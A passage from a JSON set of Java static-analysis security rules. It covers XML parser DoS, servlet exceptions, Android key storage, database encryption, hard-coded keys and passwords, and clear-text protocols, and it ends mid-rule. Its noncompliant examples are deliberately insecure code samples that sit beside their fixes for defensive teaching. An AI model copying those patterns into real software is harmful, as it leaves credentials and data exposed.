href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/409\">CWE-409 - Improper Handling of Highly Compressed Data (Data Amplification)</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/display/java/IDS04-J.+Safely+extract+files+from+ZipInputStream\">CERT, IDS04-J.</a> - Safely\n  extract files from ZipInputStream </li>\n  <li> <a href=\"https://www.bamsoftware.com/hacks/zipbomb/\">bamsoftware.com</a> - A better Zip Bomb </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "java:S6376": {
        "name": "XML parsers should not be vulnerable to Denial of Service attacks",
        "htmlDesc": "<p>XML parsers Denial of Service attacks target XML parsers, which are software components responsible for parsing and interpreting XML documents.</p>\n<h2>Why is this an issue?</h2>\n<p>XML files are complex data structures. When a malicious user is able to submit an XML file, it triggers complex processing that may overwhelm the\nparser. Most of the time, those complex processing are enabled by default, and XML parsers do not take preventive measures against Denial of Service\nattacks.</p>\n<h3>What is the potential impact?</h3>\n<p>When an attacker successfully exploits the vulnerability, it can lead to a Denial of Service (DoS) condition.</p>\n<h3>System Unavailability</h3>\n<p>Affected system becomes unresponsive or crashes, rendering it unavailable to legitimate users. This can have severe consequences, especially for\ncritical systems that rely on continuous availability, such as web servers, APIs, or network services.</p>\n<h3>Amplification Attacks</h3>\n<p>In some cases, XML parsers Denial of Service attacks can be used as a part of larger-scale amplification attacks. By leveraging the vulnerability,\nattackers can generate a disproportionately large response from the targeted system, amplifying the impact of their attack. This can result in\noverwhelming network bandwidth and causing widespread disruption.</p>\n<h2>How to fix it in Java SE</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport javax.xml.parsers.DocumentBuilderFactory;\n\nDocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, false); // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport javax.xml.parsers.DocumentBuilderFactory;\n\nDocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Java Documentation - <a\n  href=\"https://docs.oracle.com/en/java/javase/21/docs/api/java.xml/javax/xml/parsers/DocumentBuilderFactory.html\">DocumentBuilderFactory Class</a>\n  </li>\n  <li> Java Documentation - <a\n  href=\"https://docs.oracle.com/en/java/javase/21/docs/api/java.xml/javax/xml/parsers/SAXParserFactory.html\">SAXParserFactory Class</a> </li>\n  <li> Java Documentation - <a\n  href=\"https://docs.oracle.com/en/java/javase/21/docs/api/java.xml/javax/xml/validation/SchemaFactory.html\">SchemaFactory Class</a> </li>\n  <li> Java Documentation - <a\n  href=\"https://docs.oracle.com/en/java/javase/21/docs/api/java.xml/javax/xml/transform/TransformerFactory.html\">TransformerFactory Class</a> </li>\n  <li> Java Documentation - <a href=\"https://docs.oracle.com/en/java/javase/21/security/java-api-xml-processing-jaxp-security-guide.html\">Java API for\n  XML Processing (JAXP) Security Guide</a> </li>\n  <li> Dom4j Documentation - <a href=\"https://dom4j.github.io/javadoc/2.1.4/org/dom4j/io/SAXReader.html\">SAXReader Class</a> </li>\n  <li> Jdom2 Documentation - <a href=\"http://www.jdom.org/docs/apidocs/org/jdom2/input/SAXBuilder.html\">SAXBuilder class</a> </li>\n  <li> OWASP - <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#java\">XXE Prevention Cheat\n  Sheet</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE)\">Top 10 2017 Category A4 - XML External\n  Entities (XXE)</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/776\">CWE-776 - Improper Restriction of Recursive Entity References in DTDs ('XML Entity\n  Expansion')</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "java:S1989": {
        "name": "Exceptions should not be thrown from servlet methods",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Servlets are components in Java web development, responsible for processing HTTP requests and generating responses. In this context, exceptions are\nused to handle and manage unexpected errors or exceptional conditions that may occur during the execution of a servlet.</p>\n<p>Catching exceptions within the servlet allows us to convert them into meaningful, user-friendly messages. Otherwise, failing to catch exceptions\nwill propagate them to the servlet container, where the default error-handling mechanism may impact the overall security and stability of the\nserver.</p>\n<p>Possible security problems are:</p>\n<ol>\n  <li> <strong>Vulnerability to denial-of-service attacks:</strong> Not caught exceptions can leave the servlet container in an unstable state, which\n  can exhaust the available resources and make the system unavailable in the worst cases. </li>\n  <li> <strong>Exposure of sensitive information:</strong> Exceptions handled by the servlet container, by default, expose detailed error messages or\n  debugging information to the user, which may contain sensitive data such as stack traces, database connection, or system configuration. </li>\n</ol>\n<p>Unfortunately, servlet method signatures do not force developers to handle <code>IOException</code> and <code>ServletException</code>:</p>\n<pre>\npublic void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {\n}\n</pre>\n<p>To prevent this risk, this rule enforces all exceptions to be caught within the \"do*\" methods of servlet classes.</p>\n<h2>How to fix it</h2>\n<p>Surround all method calls that may throw an exception with a <code>try/catch</code> block.</p>\n<h3>Code examples</h3>\n<p>In the following example, the <code>getByName</code> method may throw an <code>UnknownHostException</code>.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {\n  InetAddress addr = InetAddress.getByName(request.getRemoteAddr()); // Noncompliant\n  //...\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {\n  try {\n    InetAddress addr = InetAddress.getByName(request.getRemoteAddr());\n    //...\n  }\n  catch (UnknownHostException ex) {  // Compliant\n    //...\n  }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/600\">CWE-600 - Uncaught Exception in Servlet</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/-zZGBQ\">CERT, ERR01-J.</a> - Do not allow exceptions to expose sensitive information </li>\n</ul>",
        "severity": "MINOR"
      },
      "java:S6288": {
        "name": "Authorizing non-authenticated users to use keys in the Android KeyStore is security-sensitive",
        "htmlDesc": "<p>Android KeyStore is a secure container for storing key materials, in particular it prevents key materials extraction, i.e. when the application\nprocess is compromised, the attacker cannot extract keys but may still be able to use them. It’s possible to enable an Android security feature, user\nauthentication, to restrict usage of keys to only authenticated users. The lock screen has to be unlocked with defined credentials\n(pattern/PIN/password, biometric).</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The application requires prohibiting the use of keys in case of compromise of the application process. </li>\n  <li> The key material is used in the context of a highly sensitive application like a e-banking mobile app. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to enable user authentication (by setting <code>setUserAuthenticationRequired</code> to <code>true</code> during key generation)\nto use keys for a limited duration of time (by setting appropriate values to <code>setUserAuthenticationValidityDurationSeconds</code>), after which\nthe user must re-authenticate.</p>\n<h2>Sensitive Code Example</h2>\n<p>Any user can use the key:</p>\n<pre>\nKeyGenerator keyGenerator = KeyGenerator.getInstance(KeyProperties.KEY_ALGORITHM_AES, \"AndroidKeyStore\");\n\nKeyGenParameterSpec builder = new KeyGenParameterSpec.Builder(\"test_secret_key_noncompliant\", KeyProperties.PURPOSE_ENCRYPT | KeyProperties.PURPOSE_DECRYPT) // Noncompliant\n    .setBlockModes(KeyProperties.BLOCK_MODE_GCM)\n    .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_NONE)\n    .build();\n\nkeyGenerator.init(builder);\n</pre>\n<h2>Compliant Solution</h2>\n<p>The use of the key is limited to authenticated users (for a duration of time defined to 60 seconds):</p>\n<pre>\nKeyGenerator keyGenerator = KeyGenerator.getInstance(KeyProperties.KEY_ALGORITHM_AES, \"AndroidKeyStore\");\n\nKeyGenParameterSpec builder = new KeyGenParameterSpec.Builder(\"test_secret_key\", KeyProperties.PURPOSE_ENCRYPT | KeyProperties.PURPOSE_DECRYPT)\n    .setBlockModes(KeyProperties.BLOCK_MODE_GCM)\n    .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_NONE)\n    .setUserAuthenticationRequired(true)\n    .setUserAuthenticationParameters (60, KeyProperties.AUTH_DEVICE_CREDENTIAL)\n    .build();\n\nkeyGenerator.init(builder)\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">Top 10 2021 Category A4 - Insecure Design</a> </li>\n  <li> <a href=\"https://developer.android.com/privacy-and-security/keystore\">developer.android.com</a> - Android keystore system </li>\n  <li> <a href=\"https://developer.android.com/privacy-and-security/keystore#UserAuthentication\">developer.android.com</a> - Require user\n  authentication for key use </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x07-v2-data_storage_and_privacy_requirements\">Mobile AppSec\n  Verification Standard - Authentication and Session Management Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m4-insecure-authentication\">Mobile Top 10 2016 Category M4 - Insecure\n  Authentication</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/522\">CWE-522 - Insufficiently Protected Credentials</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "java:S6291": {
        "name": "Using unencrypted databases in mobile applications is security-sensitive",
        "htmlDesc": "<p>Storing data locally is a common task for mobile applications. Such data includes preferences or authentication tokens for external services, among\nother things. There are many convenient solutions that allow storing data persistently, for example SQLiteDatabase, SharedPreferences, and Realm. By\ndefault these systems store the data unencrypted, thus an attacker with physical access to the device can read them out easily. Access to sensitive\ndata can be harmful for the user of the application, for example when the device gets stolen.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The database contains sensitive data that could cause harm when leaked. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to password-encrypt local databases that contain sensitive information. Most systems provide secure alternatives to plain-text\nstorage that should be used. If no secure alternative is available the data can also be encrypted manually before it is stored.</p>\n<p>The encryption password should not be hard-coded in the application. There are different approaches how the password can be provided to encrypt and\ndecrypt the database. In the case of <code>EncryptedSharedPreferences</code> the Android Keystore can be used to store the password. Other databases\ncan rely on <code>EncryptedSharedPreferences</code> to store passwords. The password can also be provided dynamically by the user of the application\nor it can be fetched from a remote server if the other methods are not feasible.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://developer.android.com/reference/kotlin/android/database/sqlite/SQLiteDatabase\">SQLiteDatabase</a>:</p>\n<pre>\nSQLiteDatabase db = activity.openOrCreateDatabase(\"test.db\", Context.MODE_PRIVATE, null); // Sensitive\n</pre>\n<p>For <a href=\"https://developer.android.com/training/data-storage/shared-preferences\">SharedPreferences</a>:</p>\n<pre>\nSharedPreferences pref = activity.getPreferences(Context.MODE_PRIVATE); // Sensitive\n</pre>\n<p>For <a href=\"https://docs.mongodb.com/realm/\">Realm</a>:</p>\n<pre>\nRealmConfiguration config = new RealmConfiguration.Builder().build();\nRealm realm = Realm.getInstance(config); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<p>Instead of SQLiteDatabase you can use <a href=\"https://www.zetetic.net/sqlcipher/sqlcipher-for-android/\">SQLCipher</a>:</p>\n<pre>\nSQLiteDatabase db = SQLiteDatabase.openOrCreateDatabase(\"test.db\", getKey(), null);\n</pre>\n<p>Instead of SharedPreferences you can use <a\nhref=\"https://developer.android.com/reference/androidx/security/crypto/EncryptedSharedPreferences\">EncryptedSharedPreferences</a>:</p>\n<pre>\nString masterKeyAlias = new MasterKeys.getOrCreate(MasterKeys.AES256_GCM_SPEC);\nEncryptedSharedPreferences.create(\n    \"secret\",\n    masterKeyAlias,\n    context,\n    EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,\n    EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM\n);\n</pre>\n<p>For Realm an encryption key can be specified in the config:</p>\n<pre>\nRealmConfiguration config = new RealmConfiguration.Builder()\n    .encryptionKey(getKey())\n    .build();\nRealm realm = Realm.getInstance(config);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">Top 10 2021 Category A4 - Insecure Design</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x07-v2-data_storage_and_privacy_requirements\">Mobile AppSec\n  Verification Standard</a> - Data Storage and Privacy Requirements </li>\n  <li> <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m2-insecure-data-storage\">Mobile Top 10 2016 Category M2</a> - Insecure Data\n  Storage </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/311\">CWE-311 - Missing Encryption of Sensitive Data</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "java:S6293": {
        "name": "Using biometric authentication without a cryptographic solution is security-sensitive",
        "htmlDesc": "<p>Android comes with Android KeyStore, a secure container for storing key materials. It’s possible to define certain keys to be unlocked when users\nauthenticate using biometric credentials. This way, even if the application process is compromised, the attacker cannot access keys, as presence of\nthe authorized user is required.</p>\n<p>These keys can be used, to encrypt, sign or create a message authentication code (MAC) as proof that the authentication result has not been\ntampered with. This protection defeats the scenario where an attacker with physical access to the device would try to hook into the application\nprocess and call the <code>onAuthenticationSucceeded</code> method directly. Therefore he would be unable to extract the sensitive data or to perform\nthe critical operations protected by the biometric authentication.</p>\n<h2>Ask Yourself Whether</h2>\n<p>The application contains:</p>\n<ul>\n  <li> Cryptographic keys / sensitive information that need to be protected using biometric authentication. </li>\n</ul>\n<p>There is a risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to tie the biometric authentication to a cryptographic operation by using a <code>CryptoObject</code> during authentication.</p>\n<h2>Sensitive Code Example</h2>\n<p>A <code>CryptoObject</code> is not used during authentication:</p>\n<pre>\n// ...\nBiometricPrompt biometricPrompt = new BiometricPrompt(activity, executor, callback);\n// ...\nbiometricPrompt.authenticate(promptInfo); // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<p>A <code>CryptoObject</code> is used during authentication:</p>\n<pre>\n// ...\nBiometricPrompt biometricPrompt = new BiometricPrompt(activity, executor, callback);\n// ...\nbiometricPrompt.authenticate(promptInfo, new BiometricPrompt.CryptoObject(cipher)); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> <a href=\"https://developer.android.com/training/sign-in/biometric-auth\">developer.android.com</a> - Use a cryptographic solution that depends\n  on authentication </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m4-insecure-authentication\">Mobile Top 10 2016 Category M4 - Insecure\n  Authentication</a> </li>\n  <li> OWASP - <a\n  href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x09-v4-authentication_and_session_management_requirements\">Mobile AppSec\n  Verification Standard - Authentication and Session Management Requirements</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/287\">CWE-287 - Improper Authentication</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "java:S6301": {
        "name": "Mobile database encryption keys should not be disclosed",
        "htmlDesc": "<p>When storing local data in a mobile application, it is common to use a database that can be encrypted. When encryption of this database is enabled,\nthe encryption key must be protected properly.</p>\n<h2>Why is this an issue?</h2>\n<p>Mobile applications often need to store data (which might be sensitive) locally. For Android, there exist several libraries that simplify this\nprocess by offering a feature-rich database system. <a href=\"https://www.zetetic.net/sqlcipher/\">SQLCipher</a> and <a\nhref=\"https://realm.io/\">Realm</a> are examples of such libraries. These libraries often add support for database encryption, to protect the contents\nfrom being read by other apps or by attackers.</p>\n<p>When using encryption for such a database, it is important that the encryption key stays secret. If this key is hardcoded in the application, then\nit should be considered compromised. The key will be known by anyone with access to the application’s binary code or source code. This means that the\nsensitive encrypted data can be decrypted by anyone having access to the binary of the mobile application.</p>\n<p>Furthermore, if the key is hardcoded, it is the same for every user. A compromise of this encryption key implicates every user of the app.</p>\n<p>The encryption key is meant to stay secret and should not be hard-coded in the application as it would mean that:</p>\n<h3>What is the potential impact?</h3>\n<p>If an attacker is able to find the encryption key for the mobile database, this can potentially have severe consequences.</p>\n<h4>Theft of sensitive data</h4>\n<p>If a mobile database is encrypted, it is likely to contain data that is sensitive for the user or the app publisher. For example, it can contain\npersonally identifiable information (PII), financial data, login credentials, or other sensitive user data.</p>\n<p>By not protecting the encryption key properly, it becomes very easy for an attacker to recover it and then decrypt the mobile database. At that\npoint, the theft of sensitive data might lead to identity theft, financial fraud, and other forms of malicious activities.</p>\n<h2>How to fix it in Realm</h2>\n<h3>Code examples</h3>\n<p>In the example below, a local database is opened using a hardcoded key. To fix this, the key is moved to a secure location instead and retrieved\nusing a <code>getKey()</code> method.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"201\" data-diff-type=\"noncompliant\">\nString key = \"gb09ym9ydoolp3w886d0tciczj6ve9kszqd65u7d126040gwy86xqimjpuuc788g\";\nRealmConfiguration config = new RealmConfiguration.Builder();\n    .encryptionKey(key.toByteArray()) // Noncompliant\n    .build();\nRealm realm = Realm.getInstance(config);\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"201\" data-diff-type=\"compliant\">\nRealmConfiguration config = new RealmConfiguration.Builder()\n    .encryptionKey(getKey())\n    .build();\nRealm realm = Realm.getInstance(config);\n</pre>\n<h3>How does this work?</h3>\n<h4>Using Android’s builtin key storage options</h4>\n<p>The <a href=\"https://developer.android.com/privacy-and-security/keystore\">Android Keystore</a> system allows apps to store encryption keys in a\ncontainer that is protected on a system level. Additionally, it can restrict when and how the keys are used. For example, it allows the app to require\nuser authentication (for example using a fingerprint) before the key is made available. This is the recommended way to store cryptographic keys on\nAndroid.</p>\n<h4>Dynamically retrieving encryption keys remotely</h4>\n<p>As user devices are less trusted than controlled environments such as the application backend, the latter should be preferred for the storage of\nencryption keys. This requires that a user’s device has an internet connection, which may not be suitable for every use case.</p>\n<h3>Going the extra mile</h3>\n<h4>Avoid storing sensitive data on user devices</h4>\n<p>In general, it is always preferable to store as little sensitive data on user devices as possible.</p>\n<p>Of course, some sensitive data always has to be stored on client devices, such as the data required for authentication. In this case, consider\nwhether the application logic can also function with a hash (or otherwise non-reversible form) of that data. For example, if an email address is\nrequired for authentication, it might be possible to use and store a hashed version of this address instead.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Android Documentation - <a href=\"https://developer.android.com/privacy-and-security/keystore\">Android Keystore system</a> </li>\n  <li> Android Documentation - <a href=\"https://developer.android.com/privacy-and-security/security-tips#UserData\">Security tips - User data</a> </li>\n  <li> OWASP Mobile Application Security Testing Guide - <a\n  href=\"https://mobile-security.gitbook.io/mobile-security-testing-guide/android-testing-guide/0x05d-testing-data-storage\">Data Storage on Android</a>\n  </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">Top 10 2021 Category A4 - Insecure Design</a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x07-v2-data_storage_and_privacy_requirements\">Mobile AppSec\n  Verification Standard - Data Storage and Privacy Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m2-insecure-data-storage\">Mobile Top 10 2016 Category M2 - Insecure\n  Data Storage</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/311\">CWE-311 - Missing Encryption of Sensitive Data</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/321\">CWE-321 - Use of Hard-coded Cryptographic Key</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "java:S2068": {
        "name": "Hard-coded passwords are security-sensitive",
        "htmlDesc": "<p>Because it is easy to extract strings from an application source code or binary, passwords should not be hard-coded. This is particularly true for\napplications that are distributed or that are open-source.</p>\n<p>In the past, it has led to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13466\">CVE-2019-13466</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15389\">CVE-2018-15389</a> </li>\n</ul>\n<p>Passwords should be stored outside of the code in a configuration file, a database, or a password management service.</p>\n<p>This rule flags instances of hard-coded passwords used in database and LDAP connections. It looks for hard-coded passwords in connection strings,\nand for variable names that match any of the patterns from the provided list.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The password allows access to a sensitive component like a database, a file storage, an API, or a service. </li>\n  <li> The password is used in production environments. </li>\n  <li> Application re-distribution is required before updating the password. </li>\n</ul>\n<p>There would be a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Store the credentials in a configuration file that is not pushed to the code repository. </li>\n  <li> Store the credentials in a database. </li>\n  <li> Use your cloud provider’s service for managing secrets. </li>\n  <li> If a password has been disclosed through the source code: change it. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nString username = \"steve\";\nString password = \"blue\";\nConnection conn = DriverManager.getConnection(\"jdbc:mysql://localhost/test?\" +\n                  \"user=\" + username + \"&amp;password=\" + password); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nString username = getEncryptedUser();\nString password = getEncryptedPassword();\nConnection conn = DriverManager.getConnection(\"jdbc:mysql://localhost/test?\" +\n                  \"user=\" + username + \"&amp;password=\" + password);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication\">Top 10 2017 Category A2 - Broken Authentication</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/798\">CWE-798 - Use of Hard-coded Credentials</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/259\">CWE-259 - Use of Hard-coded Password</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/OjdGBQ\">CERT, MSC03-J.</a> - Never hard code sensitive information </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD\">Hard Coded Password</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "java:S5332": {
        "name": "Using clear-text protocols is security-sensitive",
        "htmlDesc": "<p>Clear-text protocols such as <code>ftp</code>, <code>telnet</code>, or <code>http</code> lack encryption of transported data, as well as the\ncapability to build an authenticated connection. It means that an attacker able to sniff traffic from the network can read, modify, or corrupt the\ntransported content. These protocols are not secure as they expose applications to an extensive range of risks:</p>\n<ul>\n  <li> sensitive data exposure </li>\n  <li> traffic redirected to a malicious endpoint </li>\n  <li> malware-infected software update or installer </li>\n  <li> execution of client-side code </li>\n  <li> corruption of critical information </li>\n</ul>\n<p>Even in the context of isolated networks like offline environments or segmented cloud environments, the insider threat exists. Thus, attacks\ninvolving communications being sniffed or tampered with can still happen.</p>\n<p>For example, attackers could successfully compromise prior security layers by:</p>\n<ul>\n  <li> bypassing isolation mechanisms </li>\n  <li> compromising a component of the network </li>\n  <li> getting the credentials of an internal IAM account (either from a service account or an actual person) </li>\n</ul>\n<p>In such cases, encrypting communications would decrease the chances of attackers to successfully leak data or steal credentials from other network\ncomponents. By layering various security practices (segmentation and encryption, for example), the application will follow the\n<em>defense-in-depth</em> principle.</p>\n<p>Note that using the <code>http</code> protocol is being deprecated by <a\nhref=\"https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http\">major web browsers</a>.</p>\n<p>In the past, it has led to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-6169\">CVE-2019-6169</a> </li>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-12327\">CVE-2019-12327</a> </li>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-11065\">CVE-2019-11065</a> </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Application data needs to be protected against falsifications or leaks when transiting over the network. </li>\n  <li> Application data transits over an untrusted network. </li>\n  <li> Compliance rules require the service to encrypt data in transit. </li>\n  <li> Your application renders web pages with a relaxed mixed content policy. </li>\n  <li> OS-level protections against clear-text traffic are deactivated. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Make application data transit over a secure, authenticated and encrypted protocol like TLS or SSH. Here are a few alternatives to the most\n  common clear-text protocols:\n    <ul>\n      <li> Use <code>ssh</code> as an alternative to <code>telnet</code>. </li>\n      <li> Use <code>sftp</code>, <code>scp</code>, or <code>ftps</code> instead of <code>ftp</code>. </li>\n      <li> Use <code>https</code> instead of <code>http</code>. </li>\n      <li> Use <code>SMTP</code> over <code>SSL/TLS</code> or <code>SMTP</code> with <code>STARTTLS</code> instead of clear-text SMTP. </li>\n    </ul>  </li>\n  <li> Enable encryption of cloud components communications whenever it is possible. </li>\n  <li> Configure your application to block mixed content when rendering web pages. </li>\n  <li> If available, enforce OS-level deactivation of all clear-text traffic. </li>\n</ul>\n<p>It is recommended to secure all transport channels, even on local networks, as it can take a single non-secure connection to compromise an entire\napplication or system.</p>\n<h2>Sensitive Code Example</h2>\n<p>These clients from <a href=\"https://commons.apache.org/proper/commons-net/\">Apache commons net</a> libraries are based on unencrypted protocols and\nare not recommended:</p>\n<pre>\nTelnetClient telnet = new TelnetClient(); // Sensitive\n\nFTPClient ftpClient = new FTPClient(); // Sensitive\n\nSMTPClient smtpClient = new SMTPClient(); // Sensitive\n</pre>\n<p>Unencrypted HTTP connections, when using <a href=\"https://square.github.io/okhttp/https/\">okhttp</a> library for instance, should be avoided:</p>\n<pre>\nConnectionSpec spec = new ConnectionSpec.Builder(ConnectionSpec.CLEARTEXT) // Sensitive\n  .build();\n</pre>\n<p>Android WebView can be configured to allow a secure origin to load content from any other origin, even if that origin is insecure (mixed\ncontent):</p>\n<pre>\nimport android.webkit.WebView\n\nWebView webView = findViewById(R.id.webview)\nwebView.getSettings().setMixedContentMode(MIXED_CONTENT_ALWAYS_ALLOW); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<p>Use instead these clients from <a href=\"https://commons.apache.org/proper/commons-net/\">Apache commons net</a> and <a\nhref=\"http://www.jcraft.com/jsch/\">JSch/ssh</a> library:</p>\n<pre>\nJSch jsch = new JSch();\n\nif(implicit) {\n  // implicit mode is considered deprecated but offer the same security than explicit mode\n  FTPSClient ftpsClient = new FTPSClient(true);\n}\nelse 